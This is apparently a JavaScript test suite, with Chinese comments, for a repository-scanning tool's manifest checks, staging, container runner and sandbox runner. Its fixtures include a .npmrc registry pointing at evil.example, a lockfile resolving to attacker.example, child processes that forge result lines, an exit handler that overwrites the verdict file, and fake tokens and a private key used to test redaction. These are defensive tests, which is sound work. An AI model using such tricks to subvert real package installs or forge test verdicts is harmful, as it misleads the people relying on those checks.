check("MANIFEST:workspaces 字段被拒", () => {
  const dir = mkdtemp("mcheck-work-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", workspaces: ["packages/*"] },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === false && /workspaces/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:项目 .npmrc 被拒", () => {
  const dir = mkdtemp("mcheck-npmrc-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  fs.writeFileSync(path.join(dir, ".npmrc"), "registry=http://evil.example/");
  const out = checkManifest(dir);
  assert(out.ok === false && out.reason === "project .npmrc present", `got ${JSON.stringify(out)}`);
});

check("MANIFEST:lockfileVersion 1 被拒", () => {
  const dir = mkdtemp("mcheck-lv1-");
  const lock = validLock();
  lock.lockfileVersion = 1;
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, lock);
  const out = checkManifest(dir);
  assert(out.ok === false && /lockfileVersion not 2\/3/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:缺 integrity 被拒", () => {
  const dir = mkdtemp("mcheck-int-");
  const lock = validLock();
  delete lock.packages["node_modules/express"].integrity;
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, lock);
  const out = checkManifest(dir);
  assert(out.ok === false && /missing resolved\/integrity/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:http: 与非 443 端口被拒", () => {
  const httpDir = mkdtemp("mcheck-http-");
  const httpLock = validLock({ resolved: "http://registry.npmjs.org/express/-/express-4.18.2.tgz" });
  writeFixturePackage(httpDir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, httpLock);
  const http = checkManifest(httpDir);
  assert(http.ok === false && /not https/.test(http.reason), `http: ${JSON.stringify(http)}`);

  const portDir = mkdtemp("mcheck-port-");
  const portLock = validLock({ resolved: "https://registry.npmjs.org:8080/express/-/express-4.18.2.tgz" });
  writeFixturePackage(portDir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, portLock);
  const port = checkManifest(portDir);
  assert(port.ok === false && /port not allowed/.test(port.reason), `port: ${JSON.stringify(port)}`);
});

check("MANIFEST:非 registry 主机被拒", () => {
  const dir = mkdtemp("mcheck-host-");
  const lock = validLock({ resolved: "https://attacker.example/x.tgz" });
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, lock);
  const out = checkManifest(dir);
  assert(out.ok === false && /host not allowlisted/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:无 lockfile 被拒", () => {
  const dir = mkdtemp("mcheck-lockless-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } });
  const out = checkManifest(dir);
  assert(out.ok === false && out.reason === "no lockfile", `got ${JSON.stringify(out)}`);
});

check("MANIFEST:文件超过上限被拒", () => {
  const dir = mkdtemp("mcheck-big-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  const out = checkManifest(dir, "100");
  assert(out.ok === false && /too large/.test(out.reason), `got ${JSON.stringify(out)}`);
});

/* ------------------------------------------------------------------------- */
/* 片段:manifest 暂存与 fingerprint                                            */
/* ------------------------------------------------------------------------- */

const MANIFEST_STAGE_CODE = rawBlock("MANIFEST_STAGE_CODE");

function stage(dir, image = "node:22-slim@sha256:test", identity = "repo-a") {
  return JSON.parse(
    runNode(MANIFEST_STAGE_CODE, [dir, "2097152", image, "1", identity]).stdout,
  );
}

check("STAGE:只复制 manifest/lockfile,fingerprint 稳定", () => {
  const dir = mkdtemp("stage-ok-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  fs.writeFileSync(path.join(dir, "index.js"), "secret source");
  const first = stage(dir);
  const second = stage(dir);
  assert(first.ok === true, `expected ok, got ${JSON.stringify(first)}`);
  assert(first.fingerprint.length === 16, `fingerprint length ${first.fingerprint}`);
  assert(first.repoId.length === 20, `repoId length ${first.repoId}`);
  assert(first.fingerprint === second.fingerprint, "fingerprint must be stable");
  const files = fs.readdirSync(first.dir).sort();
  assert(files.join(",") === "package-lock.json,package.json", `staged files: ${files}`);
  assert(!fs.existsSync(path.join(first.dir, "index.js")), "source must not be staged");
});

check("STAGE:换镜像或策略会改变 fingerprint", () => {
  const dir = mkdtemp("stage-vary-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  const a = stage(dir, "node:22-slim@sha256:a", "repo-a");
  const b = stage(dir, "node:22-slim@sha256:b", "repo-a");
  assert(a.ok && b.ok, "both should pass");
  assert(a.fingerprint !== b.fingerprint, "image must affect fingerprint");
});

check("STAGE:不同仓库标识得到不同 repoId", () => {
  const dir = mkdtemp("stage-id-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  const a = stage(dir, "node:22-slim@sha256:a", "repo-a");
  const b = stage(dir, "node:22-slim@sha256:a", "repo-b");
  assert(a.repoId !== b.repoId, "identity must affect repoId");
});

check("STAGE:package.json 是符号链接时拒绝", () => {
  const dir = mkdtemp("stage-link-");
  const real = path.join(dir, "real-package.json");
  fs.writeFileSync(real, JSON.stringify({ name: "fixture", version: "1.0.0" }));
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0" });
  fs.unlinkSync(path.join(dir, "package.json"));
  try {
    fs.symlinkSync(real, path.join(dir, "package.json"), "file");
  } catch (error) {
    return; // 无权限时跳过
  }
  fs.writeFileSync(path.join(dir, "package-lock.json"), JSON.stringify(validLock()));
  const out = stage(dir);
  assert(out.ok === false && /not a regular file/.test(out.reason), `got ${JSON.stringify(out)}`);
});

/* ------------------------------------------------------------------------- */
/* runner:判定只在容器内用原始数据算,stdout 不参与                             */
/* ------------------------------------------------------------------------- */

const RUNNER_TEMPLATE = rawBlock("RUNNER_SRC");
const SANDBOX_TEMPLATE = rawBlock("SANDBOX_RUNNER_SRC");

/** 沙箱执行器的测试环境:同一份源码,仓库根与 /tmp 换成临时目录,超时从 52 秒缩到 1.5 秒。 */
function sandboxEnv() {
  const srcDir = mkdtemp("sandbox-src-");
  const tmpDir = mkdtemp("sandbox-tmp-");
  const depsDir = mkdtemp("sandbox-deps-");
  const srcPosix = srcDir.replace(/\\/g, "/");
  const tmpPosix = tmpDir.replace(/\\/g, "/");
  const depsPosix = depsDir.replace(/\\/g, "/");
  fs.writeFileSync(path.join(srcDir, "package.json"), JSON.stringify({ name: "fixture", version: "1.0.0" }));
  fs.mkdirSync(path.join(srcDir, "lib"));
  fs.writeFileSync(path.join(srcDir, "lib", "math.js"), "module.exports = { add: (a, b) => a + b };");
  // 先换 /tmp 再换 /src:临时目录本身可能就在 /tmp 下面。
  const runner = SANDBOX_TEMPLATE.split("/tmp").join(tmpPosix).split("/src").join(srcPosix).split("/deps/tree").join(depsPosix).replace("timeout: 52000", "timeout: 1500");
  return { srcDir, tmpDir, depsDir, runner };
}

function runSandbox(env, command, extraEnv = {}) {
  const b64 = Buffer.from(JSON.stringify({ command }), "utf8").toString("base64");
  const out = runNode(env.runner, [], { cwd: env.srcDir, timeout: 30000, env: { SANDBOX_SPEC_B64: b64, ...extraEnv } });
  const lines = (out.stdout || "").split(/\r?\n/);
  for (let index = lines.length - 1; index >= 0; index -= 1) {
    if (lines[index].startsWith("@@SANDBOX@@")) {
      return { record: JSON.parse(lines[index].slice("@@SANDBOX@@".length)), lines };
    }
  }
  throw new Error(`no sandbox runner output:\nstdout=${out.stdout}\nstderr=${out.stderr}`);
}

function runnerEnv() {
  const workDir = mkdtemp("runner-work-");
  const srcDir = mkdtemp("runner-src-");
  // 用正斜杠:反斜杠作为 JS 字符串转义会破坏 runner 里的 '/work/x' 字面量。
  const workPosix = workDir.replace(/\\/g, "/");
  const srcPosix = srcDir.replace(/\\/g, "/");
  fs.writeFileSync(path.join(srcDir, "package.json"), JSON.stringify({ name: "fixture", version: "1.0.0" }));
  fs.mkdirSync(path.join(srcDir, "lib"));
  const runner = RUNNER_TEMPLATE.split("/work").join(workPosix).split("/src").join(srcPosix);
  return {
    workDir,
    srcDir,
    runner,
    src: (text) => text.split("/src").join(srcPosix).split("/work").join(workPosix),
  };
}

function runRepro(env, script, assertion) {
  const spec = { script: env.src(script), assertion, proves: "test" };
  const b64 = Buffer.from(JSON.stringify(spec), "utf8").toString("base64");
  const out = runNode(env.runner, [], {
    cwd: env.srcDir,
    timeout: 60000,
    env: { REPRO_SPEC_B64: b64 },
  });
  const lines = (out.stdout || "").split(/\r?\n/);
  for (let index = lines.length - 1; index >= 0; index -= 1) {
    if (lines[index].startsWith("@@RUNNER@@")) {
      return JSON.parse(lines[index].slice("@@RUNNER@@".length));
    }
  }
  throw new Error(`no runner output:\nstdout=${out.stdout}\nstderr=${out.stderr}`);
}

const boomScript = `
const { createRequire } = require('module');
const repoRequire = createRequire('/src/package.json');
const mod = repoRequire('./lib/mod.js');
module.exports = { run: () => { try { mod.boom(); } catch (e) { return { threw: true, message: String(e.message) }; } return { threw: false, message: '' }; } };
`;

check("RUNNER:throws 断言成立 → verdict true", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = { boom() { throw new Error('kaboom'); } };");
  const out = runRepro(env, boomScript, { kind: "throws", match: "kaboom" });
  assert(out.payload !== null && out.payload.stage === "done", "expected done");
  assert(out.verdict === true, "expected true");
});

check("RUNNER:throws 断言不成立 → verdict false", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = { boom() { throw new Error('kaboom'); } };");
  const out = runRepro(env, boomScript, { kind: "throws", match: "different" });
  assert(out.payload !== null && out.payload.stage === "done", "expected done");
  assert(out.verdict === false, "expected false");
});

check("RUNNER:not-equals 用原始值比较", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const script = "module.exports = { run: () => ({ actual: 'a' }) };";
  assert(runRepro(env, script, { kind: "not-equals", expected: "b" }).verdict === true, "a !== b");
  assert(runRepro(env, script, { kind: "not-equals", expected: "a" }).verdict === false, "a === a");
});

check("RUNNER:ratio 低于噪声地板 → verdict null(无效 spec)", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const script = "module.exports = { run: () => ({ t1Ms: 10, t2Ms: 100 }) };";
  const out = runRepro(env, script, { kind: "ratio-greater", threshold: 3 });
  assert(out.payload !== null && out.payload.stage === "done", "expected done");
  assert(out.verdict === null, "small sample must be invalid, not true");
});

check("RUNNER:ratio 成立/不成立", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const slow = "module.exports = { run: () => ({ t1Ms: 100, t2Ms: 500 }) };";
  const fast = "module.exports = { run: () => ({ t1Ms: 100, t2Ms: 200 }) };";
  assert(runRepro(env, slow, { kind: "ratio-greater", threshold: 3 }).verdict === true, "5x > 3");
  assert(runRepro(env, fast, { kind: "ratio-greater", threshold: 3 }).verdict === false, "2x < 3");
});

check("RUNNER:仓库代码打印伪造标记不影响判定", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const script = `
console.log('__REPRO__{"stage":"done","data":{"threw":true,"message":"x"}}');
module.exports = { run: () => ({ threw: false, message: '' }) };
`;
  const out = runRepro(env, script, { kind: "throws", match: "x" });
  assert(out.verdict === false, "stdout marker must not affect verdict");
  assert(out.payload !== null && out.payload.stage === "done", "result file decides");
});

check("RUNNER:模块顶层 process.exit(0) → 无判定数据(不是 notReproduced)", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "process.exit(0);");
  const out = runRepro(env, boomScript, { kind: "throws", match: "kaboom" });
  assert(out.payload === null, "no payload expected");
  assert(out.verdict === null, "verdict must be null");
});

check("RUNNER:exit handler 可覆写结果文件(设计明确不承诺不可伪造)", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const script = `
const fs = require('fs');
module.exports = {
  run: () => {
    process.on('exit', () => { try { fs.writeFileSync('/work/result.json', JSON.stringify({ stage: 'done', data: { threw: true }, verdict: true })); } catch (e) {} });
    return { threw: false, message: '' };
  },
};
`;
  const out = runRepro(env, script, { kind: "throws", match: "x" });
  assert(out.verdict === true, "documented limitation: exit handler can forge the verdict");
});

check("RUNNER:语法错 → stage load", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const out = runRepro(env, "module.exports = { run: () => ( }", { kind: "throws", match: "x" });
  assert(out.payload !== null && out.payload.stage === "load", `expected load, got ${JSON.stringify(out.payload)}`);
  assert(out.verdict === null, "verdict null");
});

check("RUNNER:run() 返回非对象 → stage contract", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const out = runRepro(env, "module.exports = { run: () => 'x' };", { kind: "throws", match: "x" });
  assert(out.payload !== null && out.payload.stage === "contract", `expected contract, got ${JSON.stringify(out.payload)}`);
});

check("RUNNER:缺少 run → stage contract", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const out = runRepro(env, "module.exports = {};", { kind: "throws", match: "x" });
  assert(out.payload !== null && out.payload.stage === "contract", `expected contract, got ${JSON.stringify(out.payload)}`);
});

check("RUNNER:判定数据本身也被脱敏", () => {
  const env = runnerEnv();
  fs.writeFileSync(path.join(env.srcDir, "lib", "mod.js"), "module.exports = {};");
  const token = "ghp_abcdefghijklmnopqrstuvwx";
  const script = `module.exports = { run: () => ({ actual: '${token}' }) };`;
  const out = runRepro(env, script, { kind: "not-equals", expected: "x" });
  const serialized = JSON.stringify(out);
  assert(!serialized.includes(token), "token must be redacted in runner output");
  assert(serialized.includes("[redacted]"), "expected redaction marker");
});

check("SANDBOX:命令在仓库根执行,stdout 与 stderr 分别回传", () => {
  const { record } = runSandbox(sandboxEnv(), ["node", "-e", "console.log('sum=' + require('./lib/math').add(1, 2)); console.error('warn');"]);
  assert(record.ok === true && record.status === 0 && record.timedOut === false, JSON.stringify(record));
  assert(record.stdoutTail.includes("sum=3") && record.stderrTail.includes("warn"), "both streams come back");
});

check("SANDBOX:非零退出码原样回传", () => {
  const { record } = runSandbox(sandboxEnv(), ["node", "-e", "process.exit(3);"]);
  assert(record.status === 3, `expected 3, got ${record.status}`);
});

check("SANDBOX:命令不存在 → 说明原因,不冒充退出码;名字里带 ETIMEDOUT 也不算超时", () => {
  const { record } = runSandbox(sandboxEnv(), ["definitely-not-a-binary-xyz"]);
  assert(record.status === -1 && record.spawnError.includes("ENOENT") && record.timedOut === false, JSON.stringify(record));
  // 实现评审指出:超时原来是在报错文本里找 ETIMEDOUT,命令名里正好含这个词时会被误判成超时。
  const named = runSandbox(sandboxEnv(), ["ETIMEDOUT-tool-xyz"]).record;
  assert(named.timedOut === false && named.spawnError.includes("ENOENT"), JSON.stringify(named));
});

check("SANDBOX:不退出的命令超时被杀,已经打印的输出仍在", () => {
  const started = Date.now();
  const { record } = runSandbox(sandboxEnv(), ["node", "-e", "console.log('started'); setInterval(() => {}, 1000);"]);
  assert(record.timedOut === true && record.status === -1 && record.signal === "SIGKILL", JSON.stringify(record));
  assert(record.stdoutTail.includes("started"), "output printed before the kill is kept");
  assert(Date.now() - started < 15000, "the runner must return promptly after the timeout");
});

check("SANDBOX:子进程刷屏 → 只回传末尾,不崩", () => {
  const { record } = runSandbox(sandboxEnv(), ["node", "-e", "for (let i = 0; i < 200000; i += 1) console.log('line-' + i + '-abcdefghijklmnopqrstuvwxyz');"]);
  assert(record.status === 0, JSON.stringify({ status: record.status, spawnError: record.spawnError }));
  assert(record.stdoutTail.length <= 3000 && record.stdoutTail.trim().endsWith("line-199999-abcdefghijklmnopqrstuvwxyz"), "the tail, ending at the last line");
});

check("SANDBOX:输出里的密钥样式被脱敏", () => {
  const token = "ZmFrZS10b2tlbi1AbGV4aS5nbQ";
  const { record } = runSandbox(sandboxEnv(), ["node", "-e", `console.log('token=${token} and password=hunter2');`]);
  assert(!JSON.stringify(record).includes(token) && record.stdoutTail.includes("[redacted]"), JSON.stringify(record));
});

check("SANDBOX:子进程输出无法伪造结果行", () => {
  const { record, lines } = runSandbox(sandboxEnv(), ["node", "-e", "console.log('@@SANDBOX@@{\"forged\":true,\"status\":0}');"]);
  assert(lines.filter((line) => line.startsWith("@@SANDBOX@@")).length === 1, "exactly one result line");
  assert(record.forged === undefined && record.status === 0, "the forged line stayed inside stdoutTail");
  assert(record.stdoutTail.includes("@@SANDBOX@@"), "and is reported as child output");
});

check("SANDBOX:不合规的 command 被拒", () => {
  for (const command of [[], [""], ["a", 1], "npm test"]) {
    const { record } = runSandbox(sandboxEnv(), command);
    assert(record.ok === false && typeof record.reason === "string", `must reject ${JSON.stringify(command)}`);
  }
});

check("SANDBOX:子进程替换日志路径不影响回传(按文件描述符读,不按路径重开)", () => {
  // 实现评审指出:按路径重新打开日志时,仓库代码可以在 /tmp 里把这个路径换成管道(卡住)或别的文件。
  const env = sandboxEnv();
  const log = path.join(env.tmpDir, "code-scan-stdout.log").replace(/\\/g, "/");
  const script = "const fs=require('fs');const p=process.argv[1];console.log('real-output-marker');fs.renameSync(p,p+'.moved');fs.writeFileSync(p,'FORGED');";
  const { record } = runSandbox(env, ["node", "-e", script, "--", log]);
  assert(record.status === 0, JSON.stringify(record));
  assert(record.stdoutTail.includes("real-output-marker") && !record.stdoutTail.includes("FORGED"), `the tail must come from the file the child wrote: ${JSON.stringify(record.stdoutTail)}`);
});

check("SANDBOX:截断窗口切掉 PEM 头时,私钥正文与结尾也一并抹掉", () => {
  // 实现评审指出:先截 256 KiB 再脱敏,窗口正好切在 PEM 头之后时,正文和结尾会原样进入工作流日志。
  // 把窗口缩到 96 字节,让输出里的私钥正好被这样切开。
  const env = sandboxEnv();
  const key = "-----BEGIN PRIVATE KEY-----\n" + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=\n".repeat(3) + "-----END PRIVATE KEY-----\ntail";
  const forged = runSandbox({ ...env, runner: env.runner.replace("256 * 1024", "96") }, ["node", "-e", `process.stdout.write(${JSON.stringify(key)});`]);
  const serialized = JSON.stringify(forged.record);
  assert(!serialized.includes("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo") && forged.record.stdoutTail.includes("tail"), `key body must not survive a cut window: ${serialized}`);
  // 再放一个没有结尾的开头在后面:按「数量相等」判断会漏掉前面那块,所以要看第一个标记是不是结尾。
  const body = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=\n".repeat(2) + "-----END PRIVATE KEY-----\n" + "between\n" + "-----BEGIN PRIVATE KEY-----\n";
  const ordered = runSandbox({ ...env, runner: env.runner.replace("256 * 1024", "96") }, ["node", "-e", `process.stdout.write(${JSON.stringify(body)});`]);
  assert(!JSON.stringify(ordered.record).includes("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo") && ordered.record.stdoutTail.includes("between"), `first marker is an END: ${JSON.stringify(ordered.record)}`);
});

check("SANDBOX:依赖卷里的包经符号链接视图对 require、import 与 npm 脚本可见", () => {
  // 实现评审指出:只靠 NODE_PATH 时 ESM 的 import 找不到依赖,npm 脚本的 PATH 里也没有 .bin。
  const env = sandboxEnv();
  const pkg = path.join(env.depsDir, "tinypkg");
  fs.mkdirSync(pkg);
  fs.mkdirSync(path.join(env.depsDir, ".bin"));
  fs.writeFileSync(path.join(pkg, "package.json"), JSON.stringify({ name: "tinypkg", version: "1.0.0", main: "index.js" }));
  fs.writeFileSync(path.join(pkg, "index.js"), "module.exports = { v: 41 };");
  const bin = process.platform === "win32" ? "tinypkg.cmd" : "tinypkg";
  fs.writeFileSync(path.join(env.depsDir, ".bin", bin), process.platform === "win32" ? "@echo tinypkg-ran\r\n" : "#!/bin/sh\necho tinypkg-ran\n");
  fs.writeFileSync(path.join(env.srcDir, "package.json"), JSON.stringify({ name: "fixture", version: "1.0.0", scripts: { test: "tinypkg" } }));
  const mount = path.join(env.srcDir, "node_modules").replace(/\\/g, "/");
  const run = (command) => runSandbox(env, command, { SANDBOX_NODE_MODULES: mount });
  const cjs = run(["node", "-e", "console.log('cjs=' + require('tinypkg').v)"]);
  if (!cjs.record.stdoutTail.includes("cjs=41")) {
    // 主机不允许建符号链接时(Windows 未开开发者模式)这条只能在真实容器里验证,见 out/proto-sandbox。
    console.log(`SKIP   沙箱依赖链接视图:主机上建不了符号链接(${cjs.record.stderrTail.trim().split("\n").pop() || "unknown"})`);
    return;
  }
  const esm = run(["node", "--input-type=module", "-e", "import pkg from 'tinypkg'; console.log('esm=' + pkg.v)"]);
  assert(esm.record.stdoutTail.includes("esm=41"), `ESM import must resolve through the link view: ${JSON.stringify(esm.record)}`);
  // 主机上(Windows)没有名为 npm 的可执行文件,用 node 直接跑 npm-cli.js;容器里两者等价。
  const npmCli = path.join(path.dirname(process.execPath), "node_modules", "npm", "bin", "npm-cli.js");
  const script = run(["node", npmCli, "test"]);
  assert(script.record.stdoutTail.includes("tinypkg-ran"), `npm scripts must find bins: ${JSON.stringify(script.record)}`);
  assert(!fs.existsSync(path.join(env.srcDir, "node_modules", ".package-lock.json")), "only the volume's entries are linked");
});

check("DOCKER:定位检查同时报告 PATH 上有没有 docker 与工作区顶替", () => {
  const code = arrayBlock("DOCKER_GUARD_CODE").join("");
  const clean = mkdtemp("docker-guard-");
  const out = runNode(code, [clean]);
  assert(out.status === 0, out.stderr);
  const parsed = JSON.parse(out.stdout);
  assert(
    Array.isArray(parsed.bins) && typeof parsed.onPath === "boolean" && typeof parsed.inWorkspace === "boolean" && typeof parsed.relativePath === "boolean",
    `shape {bins, onPath, inWorkspace, relativePath}, got ${out.stdout}`,
  );
  // PATH 里的相对路径项相对当前目录(被扫的工作区)解析,可能指到仓库自带的 docker:必须按顶替处理。
  const dotted = JSON.parse(runNode(code, [clean], { env: { PATH: `${path.delimiter}bin${path.delimiter}.` } }).stdout);
  assert(dotted.onPath === false && dotted.relativePath === true, JSON.stringify(dotted));
  // PATH 上位于工作区之内的目录,哪怕写的是绝对路径,里面的 docker 也是仓库自带的。
  const tools = path.join(clean, "tools");
  fs.mkdirSync(tools);
  const fake = path.join(tools, process.platform === "win32" ? "docker.exe" : "docker");
  fs.writeFileSync(fake, "");
  if (process.platform !== "win32") fs.chmodSync(fake, 0o755);
  const inside = JSON.parse(runNode(code, [clean], { env: { PATH: tools } }).stdout);
  assert(inside.onPath === true && inside.inWorkspace === true, JSON.stringify(inside));
  const dirty = mkdtemp("docker-guard-dirty-");
  const planted = path.join(dirty, process.platform === "win32" ? "docker.exe" : "docker");
  fs.writeFileSync(planted, "");
  if (process.platform !== "win32") fs.chmodSync(planted, 0o755);
  const shadowed = JSON.parse(runNode(code, [dirty]).stdout);
  assert(shadowed.bins.length === 1, "a docker executable inside the workspace is reported");
});

/* ------------------------------------------------------------------------- */
/* 逻辑:归一化、分类、挑选、去重(从模板里抽取真实实现后编译)                    */
/* ------------------------------------------------------------------------- */

const TSC =
  process.env.TSC ||
  (() => {
    try {
      return path.join(
        path.dirname(requireFromHere.resolve("typescript/package.json")),
        "lib",
        "tsc.js",
      );
    } catch {
      return "";
    }
  })();
const DECL_BLOCKS = [
  ["interface RepoSpec", "interface"],
  ["interface PreparedRepo", "interface"],
  ["interface Capabilities", "interface"],
  ["interface SelectorSpec", "interface"],
  ["interface RawFinding", "interface"],
  ["interface Finding", "interface"],
  ["interface CheckedFinding", "interface"],
  ["type ReproAssertion", "alias"],
  ["interface ReproSpec", "interface"],
  ["interface ReproResult", "interface"],
  ["interface DockerCall", "interface"],
  ["interface ReproJob", "interface"],
  ["interface JudgeFinding", "interface"],
  ["interface JudgeInputFinding", "interface"],
  ["interface JudgeRanking", "interface"],
  ["interface DimensionSpec", "interface"],
  ["type ModeKind", "alias"],
  ["interface ModeSpec", "interface"],
  ["interface ResolvedMode", "interface"],
  ["interface FlowNote", "interface"],
  ["interface FlowLocation", "interface"],
  ["interface FlowStep", "interface"],
  ["interface GroundedFlow", "interface"],
  ["interface GraphInfo", "interface"],
  ["interface Hit", "interface"],
  ["interface Signal", "interface"],
  ["interface SelectorRun", "interface"],
  ["interface SandboxRun", "interface"],
  ["interface SandboxOutcome", "interface"],
  ["interface BatchJob", "interface"],
  ["interface SignalGroup", "interface"],
  ["interface RepoRuntime", "interface"],
  ["interface GroundingResult", "interface"],
  ["interface SourceText", "interface"],
];
/** 多行数组常量:注册表与模式表。顺序有意义——函数体在加载时就会读到它们。 */
const ARRAY_CONST_BLOCKS = ["DIMENSIONS", "SCAN_MODES", "TEST_REACH_SKIP", "A11Y_PACKAGES"];
const FUNC_BLOCKS = [
  "clip",
  "oneLine",
  "asString",
  "asNumber",
  "isRecord",
  "isSeverity",
  "isDimension",
  "dimensionLabel",
  "findingKey",
  "severityAlias",
  "squashForMatch",
  "applyJudgeRanking",
  "normalizeAssertion",
  "normalizeRepro",
  "classifyRepro",
  "selectReproJobs",
  "dedupeFindings",
  "normalizeFinding",
  "isSelectorKind",
  "isSupportedAstLang",
  "isSafeSelectorText",
  "normalizeSelectors",
  "modeKey",
  "modeDimensions",
  "resolveMode",
  "selectorPathFor",
  "activeDimensionSpecs",
  "slug",
  "parseLocation",
  "stringList",
  "normalizeFlows",
  "mermaidLabel",
  "mermaidFlows",
  "parseJsonLoose",
  "normPath",
  "isGraphUnavailable",
  "isTestPath",
  "testReachHits",
  "needsDependencyGraph",
  "parseA11yOutput",
  "relativeRepoPath",
  "firstErrorLine",
  "shortHash",
  "quoteFound",
  "quoteParts",
  "citedLocations",
  "nameKey",
  "stepLocations",
  "stepOverlap",
  "digestFindings",
  "normalizeSandboxRuns",
  "sandboxResult",
  "sandboxRevisionAsk",
  "sandboxArgv",
  "whereTarget",
  "withRepo",
  "readSourceFile",
  "groundFinding",
  "quotedSnippets",
];
const CONST_BLOCKS = ["RATIO_MIN", "RATIO_MAX", "MAX_REPRO", "MAX_FLOW_STEPS", "MAX_FLOWS_PER_REPO", "QUOTE_MIN_CHARS", "QUOTE_ELLIPSIS", "LOCATION_CITATION", "FLOW_SAME_OVERLAP", "SANDBOX_MAX_RUNS_PER_BATCH", "REPRO_IMAGE_TAG", "REPRO_IMAGE", "LOCATION_HEAD", "QUOTE_LINE_WINDOW", "SANDBOX_REQUEST_MAX_CHARS", "SOURCE_READ_MAX_BYTES"];
/** String.raw 常量,原样进入逻辑模块(模板里的 ${REDACT_SRC} 引用保持为引用)。 */
const RAW_TEMPLATE_BLOCKS = ["REDACT_SRC", "SANDBOX_RUNNER_SRC", "READ_SOURCE_CODE"];

/** 位置 index 的 `/` 是不是正则字面量的开头:前一个有效 Token 是运算符、括号或 return/case 才是,否则是除法。 */
function isRegexStart(index) {
  let cursor = index - 1;
  while (cursor >= 0 && /\s/.test(SOURCE[cursor])) cursor -= 1;
  if (cursor < 0) return true;
  const previous = SOURCE[cursor];
  if (previous === "!") {
    // TS 的非空断言 `x! / 2` 是除法:只有作为一元「非」的 `!`(前面是运算符或括号)后面才可能紧跟正则。
    let before = cursor - 1;
    while (before >= 0 && /\s/.test(SOURCE[before])) before -= 1;
    return before < 0 || (!")]}".includes(SOURCE[before]) && !/[A-Za-z0-9_$]/.test(SOURCE[before]));
  }
  return "(,=:[&|?{};+-*%~^<>".includes(previous) || /(\breturn\b|\bcase\b|=>)\s*$/.test(SOURCE.slice(Math.max(0, index - 24), index));
}

/**
 * 字符串、模板、注释、正则字面量感知的源码扫描:只在「代码位置」调用 visit(char, index),
 * 字面量内部的括号与引号不会误计数。visit 返回 true 时停下并返回该位置;扫完返回 -1。
 */
function scanCode(start, visit) {
  let mode = "code";
  let regexClass = false;
  for (let index = start; index < SOURCE.length; index += 1) {
    const char = SOURCE[index];
    const next = SOURCE[index + 1];
    if (mode === "line") { if (char === "\n") mode = "code"; continue; }
    if (mode === "block") { if (char === "*" && next === "/") { mode = "code"; index += 1; } continue; }
    if (mode === "single") { if (char === "\\") { index += 1; continue; } if (char === "'") mode = "code"; continue; }
    if (mode === "double") { if (char === "\\") { index += 1; continue; } if (char === '"') mode = "code"; continue; }
    if (mode === "template") { if (char === "\\") { index += 1; continue; } if (char === "`") mode = "code"; continue; }
    if (mode === "regex") {
      if (char === "\\") { index += 1; continue; }
      if (char === "[") { regexClass = true; continue; }
      if (char === "]") { regexClass = false; continue; }
      if (char === "/" && !regexClass) { mode = "code"; continue; }
      continue;
    }
    if (char === "/" && next === "/") { mode = "line"; index += 1; continue; }
    if (char === "/" && next === "*") { mode = "block"; index += 1; continue; }
    if (char === "/" && isRegexStart(index)) { mode = "regex"; regexClass = false; continue; }
    if (char === "'") { mode = "single"; continue; }
    if (char === '"') { mode = "double"; continue; }
    if (char === "`") { mode = "template"; continue; }
    if (visit(char, index)) return index;
  }
  return -1;
}

/** 抽取 interface 或 type 声明:interface 配对大括号,type 到第一个分号。 */
function extractDecl(marker, kind) {
  const start = SOURCE.indexOf(`${marker}`);
  if (start < 0) throw new Error(`missing ${marker}`);
  let depth = 0;
  const end = scanCode(start, (char) => {
    if (char === "{") depth += 1;
    if (char === "}") depth -= 1;
    if (kind === "interface") return char === "}" && depth === 0;
    return char === ";" && depth === 0;
  });
  if (end < 0) throw new Error(`unterminated ${marker}`);
